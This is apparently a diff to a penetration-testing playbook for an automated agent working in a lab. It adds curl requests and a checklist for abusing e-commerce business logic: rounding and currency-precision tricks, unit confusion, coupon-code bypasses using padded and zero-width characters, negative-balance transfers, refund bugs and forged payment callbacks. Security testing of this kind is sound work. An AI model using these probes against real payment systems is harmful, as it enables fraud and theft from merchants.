@@ -178,7 +178,36 @@ run_tool curl -s -X POST "http://target/api/payment" \
   -d '{}'
 ```
 
-### 7. Lab objective recall contract
+### 7. Multi-Currency / Rounding / Unit-Confusion Abuse
+
+```bash
+# Rounding-down exploitation on fractional unit prices (buy in bulk to accumulate a free unit)
+run_tool curl -s -X POST "http://target/api/cart/add" \
+  -d '{"productId":"1","quantity":1000,"price":0.0049}'
+
+# Currency-precision mismatch: pay in a currency with fewer decimal places than the ledger expects
+run_tool curl -s -X POST "http://target/api/payment" \
+  -d '{"amount":100,"currency":"JPY"}'   # JPY has 0 minor units — some backends still divide by 100
+
+# Weight/quantity unit confusion (kg vs g, item vs case) on inventory-priced goods
+run_tool curl -s -X POST "http://target/api/cart/add" \
+  -d '{"productId":"bulk-item","quantity":1,"unit":"g"}'   # priced per-kg elsewhere
+
+# Coupon stacking via differently-cased or whitespace-padded codes bypassing a single-use check
+run_tool curl -s "http://target/api/coupon/apply" -d '{"code":" DISCOUNT50"}'
+run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50 "}'
+run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50​"}'  # zero-width space
+```
+
+### 8. Referential / Cross-Object State Abuse
+
+- [ ] Split-payment abuse: pay for one order partially, then reference that partial-payment transaction ID against a *different*, more expensive order
+- [ ] Shared-cart/session confusion: two authenticated tabs/sessions manipulating the same server-side cart object — apply an item from account A's session while authenticated as account B if cart ID is guessable/sequential
+- [ ] Negative-balance-as-credit: transfer a negative amount to yourself from another account to increase your own balance instead of decreasing theirs, if the sign isn't re-validated server-side after the initial request
+- [ ] Downgrade-then-refund: purchase a premium tier, use the feature, downgrade to trigger a refund calculation bug that refunds more than was paid, or leaves premium access active post-downgrade
+- [ ] Webhook/callback trust: if a payment provider calls back to confirm a transaction, test whether the callback endpoint validates the signature/source — an attacker-forged "payment succeeded" callback can flip order state without paying
+
+### 9. Lab objective recall contract
 
 When the active profile (`lab-profile.json`) lists business-logic objectives, keep the following
 challenge-triggering logic probes alive until they either produce solved-state evidence or are
